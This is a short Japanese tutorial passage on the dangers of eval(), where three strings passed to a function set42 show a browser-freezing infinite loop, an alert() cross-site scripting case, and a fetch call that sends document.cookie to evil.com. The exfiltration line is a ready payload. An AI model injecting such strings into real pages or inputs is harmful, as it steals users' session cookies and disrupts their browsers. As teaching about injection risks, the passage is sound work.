### システムに負荷を与える例

set42("while(true){}");

- eval("while(true){} = 42;") の while(true){} が先に評価されて、無限ループに突入
- 結果として CPU使用率が上がり、ブラウザがフリーズ する

### セキュリティの問題となる例（XSS）

set42("alert('warning!!!!!')");

- ブラウザで実行すると alert() が実行される　→　ブラウザでポップアップ（開発者の意図しない動作）
- 補足：XSS（Cross-Site Scripting）とは、悪意のあるスクリプトをWebページ上に埋め込み、他のユーザーのブラウザで実行させる攻撃です。

### セキュリティの問題となる例（情報漏洩）

set42("fetch('https://evil.com?d=' + document.cookie)");

- 外部サイトにdocument.cookie でログイン中のセッション情報を送信、盗み見の危険性あり
